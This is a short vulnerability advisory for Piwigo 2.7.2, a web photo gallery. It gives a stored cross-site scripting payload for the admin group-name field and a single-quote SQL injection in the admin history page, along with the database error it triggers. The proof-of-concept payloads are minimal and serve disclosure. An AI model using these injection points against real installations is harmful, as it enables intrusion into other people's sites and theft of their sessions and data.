@@ -1,0 +1,73 @@
+               -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+                 INDEPENDENT SECURITY RESEARCHER 
+                   PENETRATION TESTING SECURITY
+               -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+ 
+
+# Exploit Title: Piwigo 2.7.2 - SQL Injection / Cross Site Scripting Vulnerability's 
+# Date: 19/12/2014
+# Url Vendor: http://www.piwigo.org/
+# Vendor Name: Piwigo 
+# Version: 2.7.2
+# CVE:  CVE-2014-1470
+# CVE References: CVE-2013-1468, CVE-2013-1469
+# Author: TaurusOmar	
+# Tiwtter: @TaurusOmar_
+# Email:  taurusomar13@gmail.com
+# Home:  overhat.blogspot.com
+# Tested On: Bugtraq Optimus
+# Risk: High
+
+
+Description
+Piwigo is a photo gallery software for the web that comes with powerful features to publish and manage your collection of pictures.
+
+
+------------------------
++ CROSS SITE SCRIPTING + 
+------------------------
+# Exploiting Description - Get into code xss in the box of group list. 
+
+<fieldset>
+<legend>Add Group</legend><p>
+<strong>Name Group</strong><br>
+YOUR GROUP NAME O POC
+<input type="text" size="20" maxlength="50" name="groupname"></p>
+<p class="actionButtons">
+<input type="submit" value="Add" name="submit_add" class="submit">
+<a id="addGroupClose" href="#">Cancel</a></p>
+<input type="hidden" value="24322c55681c00da423a8a7b21b79640" name="pwg_token">
+</fieldset>
+
+#P0c
+"><img src=x onerror=prompt(1);>
+
+#Proof Concept
+http://i.imgur.com/qFyJz6q.jpg
+
+
+------------------------
++ Sql Injection +
+------------------------
+# Exploiting Description - Sql Injection in control panel of admin and others users . 
+
+#P0c
+http://site.com/piwigo/admin.php?page=history&search_id=5'
+
+SELECT
+    date,
+    time,
+    user_id,
+    IP,
+    section,
+    category_id,
+    tag_ids,
+    image_id,
+    image_type
+  FROM ucea_history
+  WHERE 
+; in /home/site.com/public_html/piwigo/include/dblayer/functions_mysqli.inc.php on line 830
+
+#Proof Concept
+http://i.imgur.com/wpzMmmu.jpg
+
